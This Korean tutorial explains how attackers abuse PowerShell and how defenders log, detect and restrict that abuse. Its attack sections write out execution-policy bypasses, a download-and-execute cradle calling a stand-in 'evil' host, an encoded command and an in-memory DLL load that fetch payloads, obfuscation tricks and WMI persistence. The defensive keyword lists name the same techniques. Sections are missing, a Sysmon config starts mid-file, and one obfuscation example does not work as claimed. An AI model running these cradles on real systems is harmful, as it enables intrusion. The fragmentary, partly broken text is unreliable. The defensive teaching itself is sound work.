왜 공격자들은 PowerShell을 좋아할까요?

초급에서 PowerShell이 무엇인지, 기본 명령어가 어떤 것들이 있는지 배웠죠? 그런데 왜 거의 모든 APT 그룹이 PowerShell을 사용할까요?

답은 간단합니다 — PowerShell은 모든 Windows에 기본 설치되어 있고, .NET Framework에 직접 접근할 수 있어 파일 없이 메모리에서 코드를 실행할 수 있습니다. 인코딩과 난독화로 탐지를 우회하며, 네트워크 다운로드까지 한 줄로 가능합니다.

중급 과정에서는 공격자가 PowerShell을 어떻게 무기화하는지 실제 코드를 분석하고, 동시에 어떻게 탐지하고 방어하는지 — 로깅 설정, Sigma 규칙, AMSI, CLM까지 완전히 이해합니다.

#1. PowerShell 실행 정책 우회 분석

🔓

실행 정책(Execution Policy)이란?

PowerShell 실행 정책은 스크립트 실행을 제어하는 안전 기능입니다. 하지만 보안 경계(Security Boundary)가 아닙니다. Microsoft 공식 문서에서도 이를 명시합니다. 즉, 우회가 가능하도록 설계되어 있습니다.

📋 실행 정책 종류

Restricted — 스크립트 실행 불가 (기본값)
AllSigned — 서명된 스크립트만 허용
RemoteSigned — 로컬 스크립트 허용, 원격은 서명 필요
Unrestricted — 모든 스크립트 허용 (경고 표시)
Bypass — 모든 제한 무시, 경고 없음

⚠️ 왜 보안 경계가 아닌가?

실행 정책은 사용자가 실수로 스크립트를 실행하는 것을 방지할 뿐입니다. 의도적인 공격자는 15가지 이상의 방법으로 우회할 수 있습니다. 따라서 실행 정책에만 의존하는 것은 위험합니다.

🔧

주요 우회 기법 — 실전 코드

공격자가 실행 정책을 우회하는 대표적인 방법들입니다. 각 기법의 명령어와 탐지 포인트를 함께 살펴봅니다.

기법 1-ExecutionPolicy Bypass 플래그
# 가장 흔한 우회 — 프로세스 레벨에서 정책 무시
powershell.exe -ExecutionPolicy Bypass -File malicious.ps1
# 축약형 (탐지 우회 시도)
powershell.exe -ep bypass -File malicious.ps1
powershell.exe -exec bypass -File malicious.ps1
🎯 탐지 포인트: 프로세스 생성 시 커맨드라인에 "bypass" 문자열
🎯 Event ID: Sysmon 1 (Process Create), Security 4688
기법 2파이프라인 입력 (stdin)
# 파이프를 통해 스크립트를 표준 입력으로 전달
Get-Content malicious.ps1 | powershell.exe -noprofile -
# cmd에서 echo로 직접 전달
echo IEX(New-Object Net.WebClient).DownloadString('http://evil/payload') | powershell -
🎯 탐지 포인트: powershell.exe가 stdin으로 입력을 받는 패턴
🎯 부모 프로세스가 cmd.exe인 PowerShell 실행 주의
기법 3EncodedCommand를 통한 실행
# Base64로 인코딩된 명령어 직접 실행
powershell.exe -EncodedCommand SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxAC8AcABhAHkAbABvAGEAZAAnACkAKQA=
# 축약형들
powershell -enc [Base64]
powershell -e [Base64]
powershell -EC [Base64]
🎯 탐지 포인트: -enc, -e, -EncodedCommand 파라미터 탐지
🎯 Script Block Logging(4104)이 디코딩된 원본 기록!
기법 4Invoke-Expression (IEX)
# 문자열을 코드로 실행 — 실행 정책을 완전히 우회
powershell -c "IEX(Get-Content .\script.ps1 -Raw)"

🎯 탐지 포인트: "IEX", "Invoke-Expression" 키워드

#2. Base64 인코딩 & 난독화

🔐

EncodedCommand의 내부 구조

PowerShell의 -EncodedCommand는 UTF-16LE로 인코딩된 문자열을 Base64로 변환한 것입니다. 일반 Base64(UTF-8)와 다르다는 점이 핵심입니다.

encoding_demo.ps1
# ── 인코딩 과정 (공격자 관점) ──
# 1단계: 원본 명령어
$cmd = 'Write-Host "Hello from encoded command"'
# 2단계: UTF-16LE 바이트로 변환 (PowerShell 내부 인코딩)
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
# 3단계: Base64 인코딩
$encoded = [Convert]::ToBase64String($bytes)
# 결과 확인
Write-Host $encoded
# → VwByAGkAdABlAC0ASABvAHMAdAAgACIASABlAGwAbABvACAAZgByAG8AbQAgAGUAbgBjAG8AZABlAGQAIABjAG8AbQBtAGEAbgBkACIA
# ── 디코딩 과정 (분석가 관점) ──
$decoded_bytes = [Convert]::FromBase64String($encoded)
$original = [System.Text.Encoding]::Unicode.GetString($decoded_bytes)
Write-Host $original
# → Write-Host "Hello from encoded command"
🔍

실전 디코딩 — 악성 인코딩 명령 분석

실제 악성코드에서 발견되는 인코딩된 명령어를 단계별로 디코딩해 봅니다.

⚠️ 교육 목적 코드 — 실제 악성 URL이 아닌 예시입니다

# 분석 1단계: Base64 디코딩 (PowerShell)
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxAC8AcABhAHkAbABvAGEAZAAnACkAKQA='))
# 결과: IEX((New-Object Net.WebClient).DownloadString('http://192.168.1.1/payload'))
# 분석 2단계: CyberChef로 분석 (대안)
# From Base64 → Decode text (UTF-16LE) → 원본 확인
# 분석 3단계: Linux에서 디코딩
echo 'SQBFAFgA...' | base64 -d | iconv -f UTF-16LE -t UTF-8

💡 UTF-16LE Base64 빠른 식별법

PowerShell EncodedCommand의 Base64는 독특한 패턴이 있어 쉽게 식별할 수 있습니다.

UTF-16LE 특징

• ASCII 문자 뒤에 NULL 바이트(0x00) 추가
• Base64에서 "A" 문자가 빈번하게 나타남
• 예: "I" → 49 00 → Base64: SQA=
• 패턴: 매 2~3글자마다 "A" 반복

빠른 판별법

1. Base64 문자열에 "A"가 비정상적으로 많으면 UTF-16LE
2. 일반 Base64(UTF-8)보다 길이가 약 2배
3. "SQBFAFgA"로 시작하면 → "IEX(" (매우 의심)
4. "JAB"로 시작하면 → "$" (변수 선언)
🔬

심화: 다중 인코딩 및 래핑 기법

고급 공격자는 단순 Base64 인코딩 대신 다중 레이어 인코딩을 사용합니다. 분석가는 각 레이어를 순서대로 풀어야 합니다.

⚠️ 교육 목적 코드 — 다중 인코딩 분석 이해용
# ═══ 패턴 1: Double Base64 (이중 인코딩) ═══
# 1차: 원본 → UTF-16LE Base64
# 2차: 1차 결과 → 다시 UTF-8 Base64
$inner = [Convert]::ToBase64String(
[Text.Encoding]::Unicode.GetBytes('Write-Host "payload"'))
$outer = [Convert]::ToBase64String(
[Text.Encoding]::UTF8.GetBytes($inner))
# 분석가 디코딩 순서: outer(UTF-8 B64) → inner(UTF-16LE B64) → 원본
# ═══ 패턴 2: GZip 압축 + Base64 ═══
# 공격자가 자주 사용하는 압축+인코딩 조합
$bytes = [Text.Encoding]::UTF8.GetBytes('큰 스크립트 코드...')
$ms = [IO.MemoryStream]::new()
$gz = [IO.Compression.GZipStream]::new(
$ms, [IO.Compression.CompressionMode]::Compress)
$gz.Write($bytes, 0, $bytes.Length); $gz.Close()
$encoded = [Convert]::ToBase64String($ms.ToArray())
# 탐지 포인트: "FromBase64String" + "GZipStream" + "Decompress"
# ═══ 패턴 3: XOR + Base64 ═══
# XOR 키로 암호화 후 Base64 인코딩
$key = 0x42
$plainBytes = [Text.Encoding]::UTF8.GetBytes('IEX(payload)')
$xored = $plainBytes | ForEach-Object { $_ -bxor $key }
$final = [Convert]::ToBase64String([byte[]]$xored)
# 탐지 포인트: "-bxor" 연산자, ForEach + XOR 패턴

# ═══ 자동 Base64 디코딩 스크립트 (분석가용) ═══
# 이벤트 로그에서 인코딩된 명령어를 자동으로 추출하고 디코딩
function Decode-PowerShellBase64 {
param([string]$EncodedString)
# Step 1: Base64 유효성 검사
try {
$bytes = [Convert]::FromBase64String($EncodedString)
} catch {
Write-Warning "유효하지 않은 Base64 문자열"
return
}
# Step 2: UTF-16LE 여부 판단 (NULL 바이트 빈도)
$nullCount = ($bytes | Where-Object { $_ -eq 0 }).Count
$ratio = $nullCount / $bytes.Length
# UTF-16LE는 약 50%가 NULL 바이트
if ($ratio -gt 0.3) {
$decoded = [Text.Encoding]::Unicode.GetString($bytes)
Write-Host "[UTF-16LE 감지] 디코딩 결과:" -ForegroundColor Cyan
} else {
$decoded = [Text.Encoding]::UTF8.GetString($bytes)
Write-Host "[UTF-8 감지] 디코딩 결과:" -ForegroundColor Yellow
}
Write-Host $decoded
# Step 3: 재귀 디코딩 (내부에 또 Base64가 있는지 확인)
if ($decoded -match '[A-Za-z0-9+/]{40,}={0,2}') {
Write-Host "[!] 내부에 추가 Base64 발견 — 재귀 디코딩 시도" -ForegroundColor Red
Decode-PowerShellBase64 -EncodedString ($Matches[0])
}
}
# 사용 예시
Decode-PowerShellBase64 -EncodedString 'SQBFAFgAKAAoAE4AZQ...'

#3. String 난독화 기법

🎭

왜 문자열을 난독화하는가?

보안 솔루션은 "Invoke-Expression", "DownloadString", "Net.WebClient" 같은 의심 키워드를 탐지합니다. 공격자는 이 문자열들을 조각내고, 변형하고, 동적으로 조합하여 시그니처 매칭을 우회합니다.

obfuscation_techniques.ps1
⚠️ 교육 목적 코드 — 탐지 규칙 작성을 위한 이해용
# ═══ 기법 1: 문자열 연결 (Concatenation) ═══
# 원본: Invoke-Expression
$a = 'Inv' + 'oke-' + 'Exp' + 'ression'
& ($a) 'Write-Host "concatenation bypass"'
# ═══ 기법 2: Format Operator (-f) ═══
# 원본: New-Object
$b = '{0}{1}{2}' -f 'Ne','w-Ob','ject'
# ═══ 기법 3: 변수 치환 (Variable Substitution) ═══
# 원본: Net.WebClient
$c1 = 'Net.Web'
$c2 = 'Client'
& ($b) "$c1$c2"
# ═══ 기법 4: 역순 문자열 (Reverse) ═══
# 원본: DownloadString
$rev = 'gnirtSdaolnwoD'
$method = -join ($rev[-1..-($rev.Length)])
# → DownloadString
# ═══ 기법 5: Replace 난독화 ═══
# 원본: Invoke-WebRequest
$d = 'Inv##ke-Web##quest'.Replace('##','o').Replace('##','Re')
# ═══ 기법 6: Char 코드 조합 ═══
# 원본: IEX
$e = [char]73+[char]69+[char]88 # I=73, E=69, X=88
# ═══ 기법 7: Tick(`) 삽입 ═══

#4. Fileless 공격 기법

👻

Fileless 공격: 디스크에 흔적을 남기지 않는다

Fileless 공격은 디스크에 파일을 쓰지 않고 메모리에서만 실행되는 공격 기법입니다. 전통적인 파일 기반 AV는 스캔할 파일 자체가 없으므로 탐지가 극도로 어렵습니다. PowerShell은 .NET의 Reflection 기능을 통해 이를 완벽하게 지원합니다.

fileless_techniques.ps1
⚠️ 교육 목적 코드 — 허가 없는 시스템에서의 실행은 불법입니다
# ═══ 기법 1: .NET Assembly 메모리 로드 ═══
# DLL 파일을 다운로드 후 메모리에서 직접 실행
$bytes = (New-Object Net.WebClient).DownloadData('http://10.0.0.1/payload.dll')
$assembly = [System.Reflection.Assembly]::Load($bytes)
$type = $assembly.GetType('Namespace.ClassName')
$method = $type.GetMethod('Execute')
$method.Invoke($null, $null)
# → 파일이 디스크에 저장되지 않음! 메모리에서만 실행
# ═══ 기법 2: Reflection을 이용한 Win32 API 호출 ═══
# Add-Type으로 C# 코드를 인라인 컴파일하여 Win32 API 호출
$code = @"
using System;
using System.Runtime.InteropServices;
public class WinAPI {
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(
IntPtr addr, uint size, uint type, uint protect);
}
"@
Add-Type -TypeDefinition $code
# → C# 코드가 메모리에서 컴파일되고 실행됨
# ═══ 기법 3: WMI를 통한 Fileless 실행 ═══
# WMI 이벤트 구독으로 영구 실행
$filter = Set-WmiInstance -Class __EventFilter -Arguments @{
Name = 'PersistFilter'
EventNamespace = 'root\cimv2'
QueryLanguage = 'WQL'
Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
}
🎯 탐지: Sysmon 19/20/21 (WMI Event), AMSI 로깅

AMSI가 Fileless 공격을 잡는 방법

파일이 없어도 AMSI는 PowerShell 엔진 내부에서 실행 직전의 코드를 스캔합니다. 즉, 아무리 난독화하고 인코딩해도 최종 실행되는 코드는 AMSI에 노출됩니다.

// AMSI 스캔 흐름
1. PowerShell 엔진이 스크립트 블록을 파싱
2. 난독화 해제 (Script Block Logging과 동일 시점)
3. AmsiScanBuffer() 호출 → AV 엔진에 전달
4. AV 엔진이 악성 여부 판단
5. 악성이면 실행 차단 + 이벤트 로그 기록
🧬

Fileless 공격 분류 체계

Microsoft는 Fileless 공격을 3가지 유형으로 분류합니다. 각 유형에 따라 탐지 전략이 다릅니다.

Type I: 완전 Fileless

• 디스크에 어떤 파일도 쓰지 않음
• 예: WMI 이벤트 구독, 레지스트리 Run 값에 PowerShell 명령 저장
• 탐지: Sysmon 19/20/21(WMI), 13(레지스트리), 메모리 스캔

Type II: 간접 파일 활동

• 파일 자체를 실행하지는 않지만 파일 시스템에 간접적으로 접근
• 예: Reflection으로 DLL 메모리 로딩, .NET Assembly.Load()
• 탐지: Script Block 4104, .NET ETW, AMSI

Type III: 실행에 파일 필요

• 초기에는 파일이 필요하지만 이후 메모리에서만 동작
• 예: 매크로 문서 → PowerShell → 메모리 페이로드
• 탐지: Sysmon 1(프로세스), 11(파일 생성), Script Block 4104
fileless_detection.ps1
# ═══ Fileless 공격 탐지 쿼리 모음 ═══
# 1. Assembly.Load() 탐지 (Script Block 4104)
Get-WinEvent -FilterHashtable @{
LogName = 'Microsoft-Windows-PowerShell/Operational'
Id = 4104
} | Where-Object {
$_.Message -match 'Assembly.*Load|Reflection.*Assembly|LoadFile|LoadFrom'
} | Select-Object TimeCreated, @{
N='Snippet';E={$_.Message.Substring(0,[Math]::Min(300,$_.Message.Length))}
}
# 2. Add-Type 남용 탐지
Get-WinEvent -FilterHashtable @{
LogName = 'Microsoft-Windows-PowerShell/Operational'
Id = 4104
} | Where-Object {
$_.Message -match 'Add-Type.*TypeDefinition|DllImport|VirtualAlloc|CreateThread'
} | Format-Table TimeCreated, Id -AutoSize
# 3. WMI 이벤트 구독 탐지 (영구 지속성)
Get-WMIObject -Namespace root\subscription -Class __EventFilter
Get-WMIObject -Namespace root\subscription -Class __EventConsumer
Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding
# 💡 정상 시스템에서는 거의 없어야 함. 발견 시 즉시 조사!
# 4. 메모리에서 실행 중인 의심 .NET Assembly 탐지
Get-Process powershell | ForEach-Object {
$_.Modules | Where-Object {
$_.ModuleName -notlike 'System.*' -and
$_.ModuleName -notlike 'Microsoft.*'
} | Select-Object ModuleName, FileName
}

#6. PowerShell 로깅 메커니즘

📝

PowerShell 로깅: 방어의 핵심 무기

PowerShell 5.0+에서는 3가지 핵심 로깅 메커니즘을 제공합니다. 이 로깅이 활성화되면 아무리 교묘한 난독화도 원본 코드가 기록됩니다.

1. Script Block Logging (Event 4104)

실행되는 모든 스크립트 블록의 원본 코드를 기록합니다. 난독화가 해제된 상태로 기록되므로 가장 강력한 탐지 수단입니다.

# GPO 설정 경로
Computer Configuration → Administrative Templates
→ Windows Components → Windows PowerShell
→ Turn on PowerShell Script Block Logging: Enabled
# 레지스트리 직접 설정
HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
EnableScriptBlockLogging = 1 (DWORD)
EnableScriptBlockInvocationLogging = 1 (DWORD)
# 이벤트 로그 위치
Microsoft-Windows-PowerShell/Operational → Event ID 4104

2. Module Logging (Event 4103)

PowerShell 모듈 및 cmdlet 실행 기록. 어떤 cmdlet이 호출되었고 파라미터가 무엇인지 기록합니다.

# GPO 설정
→ Turn on Module Logging: Enabled
→ Module Names: * (모든 모듈 기록)
# 레지스트리
HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging
EnableModuleLogging = 1
ModuleNames\* = * (REG_SZ)

3. Transcription (파일 기록)

PowerShell 세션의 모든 입출력을 텍스트 파일로 기록합니다. 포렌식에 매우 유용합니다.

# GPO 설정
→ Turn on PowerShell Transcription: Enabled
→ Transcript output directory: C:\PSTranscripts
→ Include invocation headers: Checked
# 레지스트리
HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription
EnableTranscripting = 1
OutputDirectory = C:\PSTranscripts

결론: Script Block Logging(4104)이 가장 포괄적인 탐지 범위를 제공합니다. 반드시 GPO로 활성화하세요. Module Logging과 Transcription을 함께 활성화하면 완벽한 가시성을 확보할 수 있습니다.

ps_audit_setup.ps1
# ═══ 실전 감사 설정 스크립트 ═══
# PowerShell 전체 로깅을 한 번에 활성화하는 스크립트
# 1. Script Block Logging 활성화
$regPath = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'
New-Item -Path $regPath -Force | Out-Null
Set-ItemProperty -Path $regPath -Name 'EnableScriptBlockLogging' -Value 1 -Type DWord
Set-ItemProperty -Path $regPath -Name 'EnableScriptBlockInvocationLogging' -Value 1 -Type DWord
# 2. Module Logging 활성화
$regPath2 = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging'
New-Item -Path $regPath2 -Force | Out-Null
Set-ItemProperty -Path $regPath2 -Name 'EnableModuleLogging' -Value 1 -Type DWord
New-Item -Path "$regPath2\ModuleNames" -Force | Out-Null
Set-ItemProperty -Path "$regPath2\ModuleNames" -Name '*' -Value '*'
# 3. Transcription 활성화
$regPath3 = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription'
New-Item -Path $regPath3 -Force | Out-Null
Set-ItemProperty -Path $regPath3 -Name 'EnableTranscripting' -Value 1 -Type DWord
Set-ItemProperty -Path $regPath3 -Name 'OutputDirectory' -Value 'C:\PSTranscripts'
Set-ItemProperty -Path $regPath3 -Name 'EnableInvocationHeader' -Value 1 -Type DWord
# 4. Process Creation Audit 활성화 (Security 4688)
auditpol /set /subcategory:"Process Creation" /success:enable
# ✅ 설정 확인
Write-Host "[+] Script Block Logging: Enabled"
Write-Host "[+] Module Logging: Enabled (All modules)"
Write-Host "[+] Transcription: Enabled (C:\PSTranscripts)"
Write-Host "[+] Process Creation Audit: Enabled"

💡 운영 팁: 이벤트 로그 용량 관리

1.로그 크기 증가: PowerShell Operational 로그의 기본 크기(15MB)를 최소 100MB로 증가시키세요. 대규모 환경에서는 1GB 이상을 권장합니다.
2.SIEM 포워딩: Windows Event Forwarding(WEF) 또는 에이전트를 통해 중앙 SIEM으로 즉시 전송합니다. 공격자가 로컬 로그를 삭제해도 중앙에 보존됩니다.
3.Transcript 보호: Transcript 디렉토리에 SACL을 설정하여 삭제/수정 시도를 감사합니다. 네트워크 공유에 저장하면 더 안전합니다.
4.로그 백업: 자동 백업 스크립트로 이벤트 로그를 정기적으로 아카이빙합니다. 포렌식 시 과거 로그가 필수입니다.

#7. Sysmon 기반 탐지

🔎

Sysmon으로 PowerShell 공격 탐지하기

Sysmon(System Monitor)은 Microsoft의 무료 시스템 모니터링 도구로, 프로세스 생성, 네트워크 연결, 파일 변경 등을 상세히 기록합니다. PowerShell 공격 탐지에 가장 중요한 이벤트들을 살펴봅니다.

Event ID 1 — Process Create

프로세스 생성 시 전체 커맨드라인, 부모 프로세스, 해시값을 기록합니다.

Event ID 3 — Network Connection

<Image condition="is">C:\Windows\System32\conhost.exe</Image>
<Image condition="is">C:\Windows\System32\backgroundTaskHost.exe</Image>

<CommandLine condition="contains">ConvertTo-Json</CommandLine>
</ProcessCreate>
</RuleGroup>
<!-- Network Connection: PowerShell 외부 통신 감시 -->
<RuleGroup name="PS-Network" groupRelation="or">
<NetworkConnect onmatch="include">
<Image condition="end with">powershell.exe</Image>
<Image condition="end with">pwsh.exe</Image>
<Image condition="end with">powershell_ise.exe</Image>
</NetworkConnect>
<NetworkConnect onmatch="exclude">
<!-- 내부 네트워크 제외 -->
<DestinationIp condition="begin with">10.</DestinationIp>

</NetworkConnect>
</RuleGroup>
<!-- File Create: 의심스러운 스크립트 드롭 감시 -->
<RuleGroup name="PS-FileCreate" groupRelation="or">
<FileCreate onmatch="include">
<TargetFilename condition="end with">.ps1</TargetFilename>
<TargetFilename condition="end with">.psm1</TargetFilename>
<TargetFilename condition="end with">.psd1</TargetFilename>
<!-- Temp 폴더에 실행파일 생성 감시 -->

</FileCreate>
</RuleGroup>
</EventFiltering>
</Sysmon>

# ═══ PowerShell로 이벤트 로그 분석하기 ═══
# 1. 최근 24시간 Script Block 로그 조회
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Where-Object { $_.Id -eq 4104 -and
$_.TimeCreated -gt (Get-Date).AddHours(-24) } |
Select-Object TimeCreated, Message | Format-List

Get-WinEvent -FilterHashtable @{
LogName = 'Microsoft-Windows-PowerShell/Operational'

AppLocker + CLM 연동 — 권장 배포 전략

AppLocker 스크립트 규칙을 설정하면, 허용 목록에 없는 스크립트는 자동으로 CLM 모드로 전환됩니다. 이것이 프로덕션 환경에서 CLM을 적용하는 가장 올바른 방법입니다.

3. 규칙에 매칭되지 않는 모든 스크립트 → ConstrainedLanguage 자동 적용

AMSI: Anti-Malware Scan Interface

AMSI는 Windows 10부터 도입된 스크립트 실행 시점의 보안 스캔 인터페이스입니다. PowerShell, VBScript, JScript, .NET Assembly 등이 실행될 때, 디코딩/디난독화된 최종 코드를 AV 엔진에 전달하여 검사합니다.

AMSI 스캔 흐름 — 단계별

// AmsiScanBuffer 호출 흐름
1. 사용자가 PowerShell 명령 입력 또는 스크립트 실행
2. PowerShell 엔진이 스크립트를 파싱 + 난독화 해제
3. AmsiInitialize() → AMSI 컨텍스트 생성
4. AmsiOpenSession() → 스캔 세션 열기
5. AmsiScanBuffer() → 해제된 코드를 AV에 전달
→ Windows Defender 또는 등록된 AV 프로바이더가 스캔
6. 결과 반환: AMSI_RESULT_CLEAN / AMSI_RESULT_DETECTED
7. DETECTED면 실행 차단 + Event Log 기록
8. AmsiCloseSession() → 세션 종료

AMSI 내부 아키텍처: AmsiScanBuffer 호출 흐름

AMSI는 Windows COM 인터페이스로 구현됩니다. PowerShell 엔진은 스크립트 실행 전에 amsi.dll의 함수를 호출하여 콘텐츠를 검사합니다.

// AMSI 스캔 상세 호출 흐름
1. PowerShell.exe 시작
→ amsi.dll 로드 (System32에서)
2. AmsiInitialize() 호출
→ AMSI 컨텍스트(amsiContext) 생성
3. AmsiOpenSession() 호출
→ 스캔 세션 시작 (세션별 상태 추적)
4. 스크립트 블록 파싱 완료 (난독화 해제 후)
5. AmsiScanBuffer(amsiContext, buffer, length, contentName, session, &result)
→ buffer: 디코딩된 스크립트 원본 텍스트
→ result: AMSI_RESULT 열거형 반환
6. AV 프로바이더가 buffer 내용 검사
→ Windows Defender: MpEngine.dll
→ 3rd party AV: 자체 AMSI 프로바이더
7. 결과 반환:
AMSI_RESULT_CLEAN (0) → 실행 허용
AMSI_RESULT_NOT_DETECTED (1) → 실행 허용
AMSI_RESULT_DETECTED (32768) → 실행 차단!
8. AmsiCloseSession()

#12. 다층 탐지 아키텍처

🏰

Defense in Depth: 다층 방어 전략

단일 보안 솔루션으로는 모든 PowerShell 공격을 막을 수 없습니다. 각 보안 계층이 서로의 약점을 보완하는 다층 방어(Defense in Depth) 전략이 필수입니다.

Layer 1AMSI — 실행 시점 스캔

스크립트 실행 직전에 디코딩된 원본 코드를 AV 엔진이 스캔합니다. 난독화가 해제된 후 검사하므로 대부분의 인코딩 기반 우회를 차단합니다.

Layer 2Script Block Logging — 실행 기록

AMSI가 우회되더라도 Event 4104에 실행된 코드가 기록됩니다. 사후 포렌식과 SIEM 탐지 규칙의 핵심 데이터 소스입니다.

Layer 3CLM + AppLocker — 기능 제한

서명되지 않은 스크립트에 대해 .NET 직접 호출, Add-Type 등을 차단합니다. Fileless 공격의 핵심 기능을 원천 봉쇄합니다.

Layer 4EDR — 행위 기반 탐지

프로세스 행위를 실시간 모니터링하여 의심스러운 패턴(프로세스 인젝션, 비정상 네트워크 연결 등)을 탐지합니다. 시그니처에 의존하지 않는 행위 기반 분석입니다.

Layer 5SIEM — 상관 분석

모든 로그를 중앙에서 수집하고, Sigma 규칙과 상관 분석을 통해 단일 이벤트로는 보이지 않는 공격 체인을 탐지합니다.

🏢

SOC 운영 워크플로우: PowerShell 알림 대응 절차

SIEM에서 PowerShell 관련 알림이 트리거되었을 때, SOC 분석가가 따라야 하는 표준 대응 절차(SOP)입니다.

// SOC Tier 1 — 초기 분류 (Triage)
1. 알림 수신 → 이벤트 소스 확인 (4104? Sysmon 1? Defender 1116?)
2. 대상 호스트, 사용자, 타임스탬프 기록
3. 1차 판단: 정상 관리 활동인가? 비정상 시간대인가?
4. 커맨드라인에서 의심 키워드 확인 (-enc, -nop, IEX, DownloadString)
// SOC Tier 2 — 심층 분석
5. Base64 인코딩이 있으면 → 디코딩하여 원본 확인
6. 부모 프로세스 트리 분석 (Sysmon 1 → ParentImage)
7. 네트워크 연결 확인 (Sysmon 3 → 외부 IP/도메인 VirusTotal 조회)
8. 파일 생성 확인 (Sysmon 11 → 의심 경로에 파일 드롭?)
9. 해당 사용자의 다른 호스트에서 유사 활동 검색
// SOC Tier 3 — 인시던트 대응
10. 확인된 공격이면: 호스트 격리, 계정 비활성화
11. 포렌식 이미지 수집 (메모리 덤프 + 디스크 이미지)
12. 측면 이동 범위 확인 → 영향받은 시스템 전체 격리
13. IOC(Indicator of Compromise) 추출 → 전사 스캔
14. 인시던트 보고서 작성 및 복구 계획 수립

Script Block Logging + Module Logging 활성화. Sysmon 설치 및 기본 설정. 로그를 수집하지만 능동적 탐지는 부족합니다.
Level 2능동적 탐지
SIEM에 Sigma 규칙 적용. CLM + AppLocker 배포. 자동 알림 및 기본 상관 분석. 대부분의 알려진 공격을 탐지할 수 있습니다.
Level 3위협 헌팅
EDR + SIEM 상관 분석 + 행위 기반 탐지. 위협 헌팅 팀이 능동적으로 미탐지 위협 탐색. 제로데이 공격도 행위 기반으로 식별 가능합니다.

Quick Reference: 의심 활동 즉시 확인 명령어

인시던트 대응 시 즉시 사용할 수 있는 원라이너 명령어 모음입니다. 북마크해 두세요.

# ═══ 즉시 확인 명령어 (원라이너) ═══
# 최근 1시간 의심 PowerShell 활동
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104;StartTime=(Get-Date).AddHours(-1)} -ErrorAction SilentlyContinue | Where-Object { $_.Message -match 'IEX|Download|WebClient|Reflection|Assembly|VirtualAlloc' } | Measure-Object
# 현재 실행 중인 PowerShell 프로세스와 커맨드라인
Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" | Select-Object ProcessId, CommandLine, CreationDate | Format-List
# WMI 이벤트 구독 점검 (Fileless 지속성)
Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding 2>$null | Select-Object __PATH
# 스케줄 태스크에서 PowerShell 호출 찾기
Get-ScheduledTask | Where-Object { $_.Actions.Execute -match 'powershell|pwsh' } | Select-Object TaskName, State, @{N='Cmd';E={$_.Actions.Arguments}}
# AMSI 프로바이더 상태 확인
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers' | ForEach-Object { $_.PSChildName }
# PowerShell v2 설치 여부 (보안 취약점)
Get-WindowsOptionalFeature -Online -FeatureName 'MicrosoftWindowsPowerShellV2Root' | Select-Object FeatureName, State
# 최근 Defender AMSI 탐지 이벤트
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Windows Defender/Operational';Id=1116,1117} -MaxEvents 10 -ErrorAction SilentlyContinue | Select-Object TimeCreated, Message
# 레지스트리 Run Key 지속성 점검
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' | Format-List
Get-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' | Format-List
# 네트워크 연결 중인 PowerShell 프로세스
Get-NetTCPConnection | Where-Object {
(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Name -match 'powershell|pwsh'
} | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State
# Script Block Logging 활성화 상태 확인
Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -ErrorAction SilentlyContinue
# 💡 이 명령어들을 스크립트로 저장하여 정기 점검에 활용하세요
